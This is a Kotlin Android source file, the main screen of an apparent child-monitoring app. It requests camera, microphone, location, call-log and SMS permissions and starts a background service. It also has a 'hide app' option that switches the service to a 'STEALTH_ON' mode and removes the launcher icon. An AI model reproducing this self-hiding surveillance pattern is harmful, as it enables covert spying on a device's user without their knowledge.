package com.soumo.child

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.ImageButton
import android.widget.PopupWindow
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.card.MaterialCardView
import com.soumo.child.id.DeviceIdManager
import com.soumo.child.permissions.PermissionManager

/** ————————————————————————————————————————————————————————————————————————————————
 * MainActivity.kt
 * ————————————————————————————————————————————————————————————————————————————————
 * MainActivity is the main entry point of the app.
 * It loads the UI by canning - CatalogFragment.
 * It also manages permission requests using PermissionManager.
 * Permissions are requested just once when the activity is created. Annoying repeated requests are avoided.
 * If any permission is denied, the app will not function fully but will not keep asking for permissions.
 * Any denied permissions will disable some features but not crash the app.
 * The permission flow is as follows:
 * 1. Request foreground permissions (camera, audio, location, call log, SMS, notifications if Android 13+).
 * 2. If foreground permissions are granted, request background location permission (if Android 10+).
 * On granting all permissions, it starts BackgroundService.
 */
class MainActivity : AppCompatActivity() { // Main entry point of the app
    private lateinit var permissionManager: PermissionManager // Manages permission requests
    private var statusReceiver: BroadcastReceiver? = null

    private lateinit var loadingGroup: View
    private lateinit var childIdText: TextView
    private lateinit var statusText: TextView
    private lateinit var settingsButton: ImageButton

    private var statusCopy: String = "Connecting…"

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    override fun onCreate(savedInstanceState: Bundle?) { // Called when activity is created
        super.onCreate(savedInstanceState) // Call superclass implementation
        permissionManager = PermissionManager(this) // Initialize PermissionManager
        setContentView(R.layout.activity_main)

        loadingGroup = findViewById(R.id.loading_group)
        childIdText = findViewById(R.id.child_id_text)
        statusText = findViewById(R.id.status_text)
        settingsButton = findViewById(R.id.settings_button)

        setupInitialState()
        configureSettingsMenu()

        // Register broadcast receiver for connection status
        val filter = IntentFilter(BackgroundService.ACTION_CONNECTION_STATUS)
        statusReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val s = intent?.getStringExtra(BackgroundService.EXTRA_STATUS)
                if (!s.isNullOrBlank()) {
                    Log.d("MainActivity", "Status update: $s")
                    statusCopy = s
                    updateStatusText(s)
                }
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(statusReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(statusReceiver, filter)
        }

        // Check if permissions are already granted and start service immediately
        if (permissionManager.allPermissionsGranted()) {
            Log.d("MainActivity", "▲ → Permissions already granted, starting BackgroundService")
            val svc = Intent(this, BackgroundService::class.java) // Intent for BackgroundService
            startService(svc) // Start the service
            Log.d("MainActivity", "→ → BackgroundService started")
        } else {
            updateStatusText("Permissions required")
        }
    }

    override fun onResume() {
        super.onResume()
        setupInitialState()
    }

    override fun onDestroy() {
        try {
            statusReceiver?.let { unregisterReceiver(it) }
        } catch (_: Exception) { }
        statusReceiver = null
        super.onDestroy()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) { // Handle permission request results
        super.onRequestPermissionsResult(requestCode, permissions, grantResults) // Call superclass implementation
        permissionManager.onRequestPermissionsResult(requestCode) { allGranted -> // Callback with overall permission result
            if (allGranted) {
                Log.d("MainActivity", "🫡 All permissions granted, starting BackgroundService")
                val svc = Intent(this, BackgroundService::class.java) // Intent for BackgroundService
                startService(svc) // Start the service
                Log.d("MainActivity", "🤫 BackgroundService start command sent")
                updateStatusText("Connecting…")
            } else {
                Toast.makeText(this, "App will not work properly if any permission is denied.", Toast.LENGTH_LONG).show()
                Log.d("MainActivity", "❌ Some permissions denied, app may have limited functionality")
                updateStatusText("Permissions required")
            }
        }
    }

    private fun setupInitialState() {
        val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
        val cachedId = DeviceIdManager.cachedId ?: prefs.getString("device_id", null)

        if (cachedId.isNullOrBlank()) {
            loadingGroup.visibility = View.VISIBLE
            childIdText.visibility = View.GONE
            statusText.visibility = View.GONE
        } else {
            loadingGroup.visibility = View.GONE
            childIdText.visibility = View.VISIBLE
            statusText.visibility = View.VISIBLE
            childIdText.text = DeviceIdManager.format(cachedId)
            updateStatusText(statusCopy)
        }
    }

    private fun updateStatusText(status: String) {
        statusCopy = status
        statusText.visibility = View.VISIBLE
        statusText.text = status
    }

    private fun configureSettingsMenu() {
        val popupView = layoutInflater.inflate(R.layout.view_settings_menu, null, false)
        val popupWindow = PopupWindow(
            popupView,
            android.view.ViewGroup.LayoutParams.WRAP_CONTENT,
            android.view.ViewGroup.LayoutParams.WRAP_CONTENT,
            true
        ).apply {
            elevation = 20f
            setBackgroundDrawable(ContextCompat.getDrawable(this@MainActivity, R.drawable.menu_dropdown_bg))
            isOutsideTouchable = true
        }

        val requestBtn = popupView.findViewById<View>(R.id.menu_request_permissions_btn)
        val hideBtn = popupView.findViewById<View>(R.id.menu_hide_app_btn)

        requestBtn.setOnClickListener {
            popupWindow.dismiss()
            if (permissionManager.allPermissionsGranted()) {
                Log.d("MainActivity", "Permissions already granted via button, ensuring service is running")
                val svc = Intent(this, BackgroundService::class.java)
                startService(svc)
                updateStatusText("Connecting…")
            } else {
                permissionManager.showPermissionRationaleDialog(
                    onGrant = { permissionManager.startPermissionFlow() },
                    onCancel = { updateStatusText("Permissions required") }
                )
            }
        }

        hideBtn.setOnClickListener {
            popupWindow.dismiss()
            try {
                val intent = Intent(this, BackgroundService::class.java)
                intent.action = "STEALTH_ON"
                startService(intent)
            } catch (e: Exception) {
                Log.e("MainActivity", "Failed to send STEALTH_ON intent", e)
            }
            try {
                val pm = packageManager
                val componentName = ComponentName(this, MainActivity::class.java)
                pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (e: Exception) {
                Log.e("MainActivity", "Failed to hide launcher icon", e)
            }
        }

        settingsButton.setOnClickListener {
            if (!popupWindow.isShowing) {
                // Measure popup content to place it above the anchor
                val widthSpec = View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED)
                val heightSpec = View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED)
                popupView.measure(widthSpec, heightSpec)
                val popupHeight = popupView.measuredHeight
                val extra = (8 * resources.displayMetrics.density).toInt() // 8dp gap
                val yoff = -(settingsButton.height + popupHeight + extra)
                popupWindow.showAsDropDown(settingsButton, 0, yoff)
            } else {
                popupWindow.dismiss()
            }
        }
    }
}